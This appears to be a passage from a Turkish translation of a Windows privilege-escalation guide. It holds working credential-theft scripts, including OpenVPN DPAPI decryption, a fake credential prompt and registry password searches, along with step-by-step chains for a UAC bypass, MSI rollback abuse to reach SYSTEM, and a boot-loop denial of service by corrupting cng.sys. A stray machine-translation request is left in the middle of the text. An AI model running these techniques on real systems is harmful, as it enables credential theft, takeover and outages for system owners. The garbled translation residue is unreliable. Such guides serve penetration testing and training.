C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Kullanıcıdan kendi **kimlik bilgilerini** veya hatta başka bir kullanıcının **kimlik bilgilerini** girmesini her zaman **isteyebilirsiniz**, eğer onları bilebileceğini düşünüyorsanız (dikkat edin, müşteriden doğrudan **kimlik bilgilerini istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilen olası dosya adları**

Bir zamanlar **düz metin** veya **Base64** olarak **parolalar** içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Lütfen çevrilmesi gereken dosya içeriğini paylaşın; şu anda yalnızca “Search all of the proposed files:” ifadesi var.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin içinde Credentials

İçinde credentials aramak için Bin’i de kontrol etmelisiniz

Birkaç program tarafından kaydedilmiş **passwords**’leri **recover** etmek için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Credentials içeren diğer olası registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry’den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** içinde saklanan şifrelerin olduğu db’leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; böylece orada da bazı **şifreler saklanmış olabilir**.

Tarayıcılardan şifre çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemi içinde yerleşik olan ve farklı dillerdeki yazılım bileşenleri arasında **intercommunication** sağlayan bir teknolojidir. Her COM bileşeni bir **class ID (CLSID)** ile **identified via** edilir ve her bileşen, interface ID’leri (IID’ler) ile tanımlanan bir veya daha fazla interface aracılığıyla işlevsellik sunar.

COM class ve interface’leri registry içinde sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlıdır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Bu registry’nin CLSID’leri içinde, bir **DLL**’ye işaret eden **default value** ve **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değer içeren alt registry **InProcServer32**’yi bulabilirsiniz.

![](<../../images/image (729).png>)

Temel olarak, yürütülecek **DLL**’lerden herhangi birini **overwrite** edebilirseniz, eğer o DLL başka bir kullanıcı tarafından yürütülecekse **privileges** yükseltebilirsiniz.

Saldırganların COM Hijacking’i bir persistence mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry’de genel şifre araması**

**Dosya içeriğinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosya arayın**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Registry’de key adlarını ve passwords’ları ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin’idir; bunu, **kurban içinde kimlik bilgileri arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri düz metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Sızdırılmış Handle’lar

**SYSTEM olarak çalışan bir process yeni bir process açtığında** (`OpenProcess()`) **tam erişimle** bunu hayal edin. Aynı process, **düşük yetkilerle yeni bir process de oluşturur** (`CreateProcess()`), **ama ana process’in açık tüm handle’larını miras alır**.\
Sonra, **düşük yetkili process’e tam erişiminiz** varsa, `OpenProcess()` ile oluşturulan **ayrıcalıklı process’e ait açık handle’ı** ele geçirip bir **shellcode enjekte edebilirsiniz**.\
Bu zafiyeti **nasıl tespit edip istismar edeceğinize dair daha fazla bilgi için bu örneği okuyun**.](leaked-handle-exploitation.md)\
**Farklı yetki seviyeleriyle miras alınan process ve thread’lerin daha fazla açık handle’ını nasıl test edip kötüye kullanacağınıza dair daha eksiksiz bir açıklama için bu diğer yazıyı okuyun (yalnızca tam erişim değil)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipes** olarak adlandırılan paylaşılan memory segmentleri, process iletişimini ve veri aktarımını sağlar.

Windows, **Named Pipes** adlı bir özellik sunar; bu, ilişkisiz process’lerin, farklı ağlar üzerinde bile veri paylaşmasına izin verir. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

Veri bir **client** tarafından pipe üzerinden gönderildiğinde, pipe’ı kuran **server**, gerekli **SeImpersonate** yetkilerine sahipse, **client’ın kimliğini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde o process’in kimliğini benimseyerek **daha yüksek yetkiler elde etme** fırsatı sunar. Böyle bir saldırıyı yürütme talimatları için yararlı kılavuzlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki tool, **bir named pipe iletişimini burp benzeri bir tool ile intercept etmeye** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc bulmak için tüm pipe’ları listeleyip görmeyi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) ifşa eder. Uzaktan kimliği doğrulanmış bir client, `ClientAttach`’i herhangi bir mevcut dosyaya yönelik arbitrar **4-byte write**’a çevirmek için mailslot tabanlı async event yolunu kötüye kullanabilir; yeter ki dosya `NETWORK SERVICE` tarafından yazılabilir olsun. Ardından Telephony admin yetkileri elde eder ve service olarak arbitrar bir DLL yükler. Tam akış:

- `pszDomainUser` writable bir mevcut path olarak ayarlanmış `ClientAttach` → service bunu `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini o handle’a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, sonra deterministic write’ları tekrar etmek için unregister/shutdown yapın.
- Kendinizi `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna ekleyin, yeniden bağlanın, ardından `TSPI_providerUIIdentify`’i `NETWORK SERVICE` olarak çalıştırmak için arbitrar bir DLL path ile `GetUIDllName` çağırın.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows’ta stuff çalıştırabilecek File Extensions

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın

### Markdown renderer’lar üzerinden Protocol handler / ShellExecute abuse

`ShellExecuteExW`’e iletilen tıklanabilir Markdown linkleri, tehlikeli URI handler’larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve attacker-controlled dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Şifreler için Command Line’ları İzleme**

Bir kullanıcı olarak shell elde edildiğinde, credentials’ı command line üzerinde **geçiren** scheduled task’ler veya başka process’ler çalışıyor olabilir. Aşağıdaki script, process command line’larını her iki saniyede bir toplar ve mevcut durumu önceki durumla karşılaştırarak farkları çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden şifre çalma

## Low Priv User'dan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Eğer graphical interface'e erişiminiz varsa (console veya RDP üzerinden) ve UAC enabled ise, Microsoft Windows'un bazı versions'larında, unprivileged bir user'dan "NT\AUTHORITY SYSTEM" olarak bir terminal veya "NT\AUTHORITY SYSTEM" gibi başka herhangi bir process çalıştırmak mümkündür.

Bu, aynı vulnerability ile hem privileges yükseltmeyi hem de aynı anda UAC bypass yapmayı mümkün kılar. Ek olarak, herhangi bir şey install etmeye gerek yoktur ve süreç sırasında kullanılan binary Microsoft tarafından signed ve issued edilmiştir.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu vulnerability'yi exploit etmek için aşağıdaki adımları gerçekleştirmek gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium’dan High Integrity Level’a / UAC Bypass

Integrity Levels hakkında **öğrenmek için bunu okuyun**:


{{#ref}}
integrity-levels.md
{{#endref}}

Sonra **UAC ve UAC bypasses hakkında öğrenmek için bunu okuyun:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename’den SYSTEM EoP’ye

[**Bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) anlatılan teknik, [**burada mevcut olan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) bir exploit code ile birlikte.

Saldırı temelde, Windows Installer’ın rollback özelliğini kullanarak uninstall işlemi sırasında meşru dosyaları malicious olanlarla değiştirmeyi suistimal eder. Bunun için attacker’ın, daha sonra Windows Installer tarafından diğer MSI paketlerinin uninstall sırasında rollback files saklamak için kullanılacak olan `C:\Config.Msi` klasörünü hijack etmek amacıyla kullanılacak **malicious bir MSI installer** oluşturması gerekir; bu rollback files da malicious payload içerecek şekilde değiştirilmiş olacaktır.

Özet teknik şu şekildedir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI’ı kur
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluştur.
- Installer’ı **"UAC Compliant"** olarak işaretle, böylece **non-admin user** bunu çalıştırabilir.
- Kurulumdan sonra dosya üzerinde açık bir **handle** bırak.

- Adım 2: Uninstall işlemine başla
- Aynı `.msi`’yi uninstall et.
- Uninstall işlemi dosyaları `C:\Config.Msi` içine taşımaya ve onları `.rbf` dosyalarına (rollback backups) yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya handle’ını `GetFinalPathNameByHandle` ile **poll** et.

- Adım 3: Özel senkronizasyon
- `.msi` içinde bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur:
- `.rbf` yazıldığında sinyal verir.
- Ardından uninstall devam etmeden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` silinmesini engelle
- Sinyal verildiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **aç** — bu, onun silinmesini **engeller**.
- Sonra uninstall’ın tamamlanabilmesi için geri **sinyal ver**.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf`’yi manuel sil
- Sen (attacker) `.rbf` dosyasını manuel olarak sil.
- Artık **`C:\Config.Msi` boş**; hijack edilmeye hazır.

> Bu noktada, **SYSTEM-level arbitrary folder delete vulnerability** tetiklenerek `C:\Config.Msi` silinir.

2. **Aşama 2 – Rollback Script’lerini Malicious Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi`’yi Weak ACL’lerle yeniden oluştur
- `C:\Config.Msi` klasörünü kendin yeniden oluştur.
- **Weak DACLs** ayarla (ör. Everyone:F) ve `WRITE_DAC` ile **açık bir handle** bırak.

- Adım 7: Başka bir kurulum çalıştır
- `.msi`’yi yeniden kur, şu şekilde:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir hata tetikleyen değişken.
- Bu kurulum, tekrar **rollback** tetiklemek için kullanılacak; rollback da `.rbs` ve `.rbf` dosyalarını okur.

- Adım 8: `.rbs` için izle
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi` klasörünü yeni bir `.rbs` görünene kadar izle.
- Dosya adını yakala.

- Adım 9: Rollback öncesi senkronize ol
- `.msi` içinde bir **custom install action (`SyncBeforeRollback`)** bulunur:
- `.rbs` oluşturulduğunda bir event sinyali verir.
- Ardından devam etmeden önce **bekler**.

- Adım 10: Weak ACL’yi yeniden uygula
- `.rbs created` event’ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` üzerine **strong ACLs**’yi yeniden uygular.
- Ancak sende hâlâ `WRITE_DAC` ile bir handle olduğu için, **weak ACLs**’yi tekrar uygulayabilirsin.

> ACLs yalnızca handle open sırasında zorlanır, bu yüzden klasöre yazmaya devam edebilirsin.

- Adım 11: Sahte `.rbs` ve `.rbf` bırak
- `.rbs` dosyasının üzerine Windows’a şunu yaptıran **sahte bir rollback script** yaz:
- `.rbf` dosyanı (malicious DLL) **privileged bir konuma** geri yükle (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- **Malicious SYSTEM-level payload DLL** içeren sahte `.rbf` dosyanı bırak.

- Adım 12: Rollback’i tetikle
- Installer’ın devam etmesi için sync event’ini sinyal ver.
- Kurulumu bilerek bilinen bir noktada **başarısız** yapmak için bir **type 19 custom action (`ErrorOut`)** yapılandırılır.
- Bu, **rollback** sürecini başlatır.

- Adım 13: SYSTEM senin DLL’ini kurar
- Windows Installer:
- Senin malicious `.rbs` dosyanı okur.
- `.rbf` DLL’ini hedef konuma kopyalar.
- Artık senin **malicious DLL’in SYSTEM-loaded bir path** içinde vardır.

- Son Adım: SYSTEM kodunu çalıştır
- Hijack ettiğin DLL’i yükleyen güvenilir bir **auto-elevated binary** çalıştır (ör. `osk.exe`).
- **Boom**: Kodun **SYSTEM olarak** çalışır.


### Arbitrary File Delete/Move/Rename’den SYSTEM EoP’ye

Ana MSI rollback tekniği (bir önceki) bir **tüm klasörü** silebildiğini varsayar (ör. `C:\Config.Msi`). Peki ya vulnerability yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**’ı suistimal edebilirsin: her klasörün adı verilen gizli bir alternate data stream vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgisini saklar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS klasörün **tamamını** filesystem'den kaldırır.

Bunu, şu gibi standart file deletion API'leri kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız bile, **folder’ı kendisi siler**.

### Folder Contents Delete to SYSTEM EoP
Ya primitive’iniz keyfi files/folders silmeye izin vermiyorsa, ama **saldırganın kontrol ettiği bir folder’ın *contents*’ini silmeye izin veriyorsa**?

1. Step 1: Yem folder ve file oluştur
- Create: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** koy
- Oplock, ayrıcalıklı bir process `file1.txt` silmeye çalıştığında **execution’ı duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım: SYSTEM process’ini tetikle (ör. `SilentCleanup`)
- Bu process klasörleri tarar (ör. `%TEMP%`) ve içeriklerini silmeye çalışır.
- `file1.txt`’ye ulaştığında, **oplock tetiklenir** ve kontrolü senin callback’ine verir.

4. Adım: oplock callback içinde – silmeyi yönlendir

- Seçenek A: `file1.txt`’yi başka bir yere taşı
- Bu, oplock’u bozmadan `folder1`’i boşaltır.
- `file1.txt`’yi doğrudan silme — bu, oplock’un erken serbest kalmasına neden olur.

- Seçenek B: `folder1`’i bir **junction** haline getir:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini saklayan NTFS internal stream’i hedefler — bunu silmek, klasörü siler.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin** olarak **keyfi bir klasör oluşturmanıza** izin veren bir primitive kullanın — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver** adını taşıyan bir **klasör** (dosya değil) oluşturun, örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver öğesine karşılık gelir.
- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver öğesini yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` yüklemeye çalışır.
- Klasörü görür, **gerçek driver öğesini çözemediği için başarısız olur** ve **çöker ya da boot işlemini durdurur**.
- **Fallback yoktur**, ayrıca dış müdahale olmadan **kurtarma yoktur** (örn. boot repair veya disk erişimi).

### Privileged log/backup paths + OM symlinks ile arbitrary file overwrite / boot DoS

Bir **privileged service**, yazılabilir bir **config** içinden okunan bir path’e log/export yazdığında, bu path’i **Object Manager symlinks + NTFS mount points** ile yönlendirerek privileged write işlemini arbitrary overwrite’e dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef path’i saklayan config attacker tarafından yazılabilir olmalı (örn. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O path’e yazan bir privileged operation (log, export, report).

**Örnek zincir**
1. Privileged log hedefini geri almak için config’i oku, örn. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Path’i admin olmadan yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log yazmasını bekle (örn. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` içine düşer.
4. Ezilmiş hedefi (hex/PE parser) inceleyerek bozulmayı doğrula; reboot, Windows’un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu aynı zamanda, ayrıcalıklı bir service’in yazmak için açacağı herhangi bir protected file için de genelleştirilebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` içinde bir kopya varsa önce o denenebilir; bu da onu bozuk veri için güvenilir bir DoS sink yapar.



## **High Integrity'den System'e**

### **Yeni service**

Eğer zaten High Integrity bir process üzerinde çalışıyorsan, **SYSTEM'e giden path** sadece **yeni bir service oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken, geçerli bir service olduğundan veya binary’nin gerekli işlemleri yeterince hızlı yaptığından emin olun; aksi halde geçerli bir service değilse 20s içinde öldürülür.

### AlwaysInstallElevated

Yüksek Integrity bir process’ten **AlwaysInstallElevated registry entries**’lerini **enable** etmeyi ve bir _**.msi**_ wrapper kullanarak bir reverse shell **install** etmeyi deneyebilirsiniz.\
[İlgili registry keys ve bir _.msi_ package’in nasıl install edileceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu burada** [**bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate to Full Token privileges

Eğer bu token privileges’e sahipseniz (muhtemelen bunu zaten High Integrity bir process içinde bulacaksınız), SeDebug privilege ile **neredeyse herhangi bir process**’i (protected processes değil) **açabilecek**, process’in **token**’ını **kopyalayabilecek** ve bu token ile **keyfi bir process** oluşturabileceksiniz.\
Bu technique genellikle **SYSTEM olarak çalışan ve tüm token privileges’e sahip herhangi bir process’i seçer** (_evet, tüm token privileges’e sahip olmayan SYSTEM process’leri bulabilirsiniz_).\
**Önerilen technique’i çalıştıran bir code örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Technique, bir **pipe oluşturmayı ve ardından o pipe’a yazmak için bir service oluşturmayı/abuse etmeyi** içerir. Sonra, **SeImpersonate** privilege’ini kullanarak pipe’ı oluşturan **server**, pipe client’ının (service’in) **token**’ını **impersonate edebilir** ve SYSTEM privileges elde eder.\
name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız şunu okumalısınız**](#named-pipe-client-impersonation).\
High integrity’den System’a name pipes kullanarak nasıl geçileceğine dair bir örnek okumak istiyorsanız [**şunu okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer **SYSTEM** olarak çalışan bir **process** tarafından **loaded** edilen bir dll’yi **hijack** etmeyi başarırsanız, bu permissions ile keyfi code çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır ve ayrıca high integrity bir process’ten çok daha **kolay elde edilir**, çünkü dll’lerin load edilmesinde kullanılan klasörlerde **write permissions**’a sahip olur.\
**Dll hijacking hakkında daha fazla bilgi edinmek için buraya bakabilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vector’larını bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

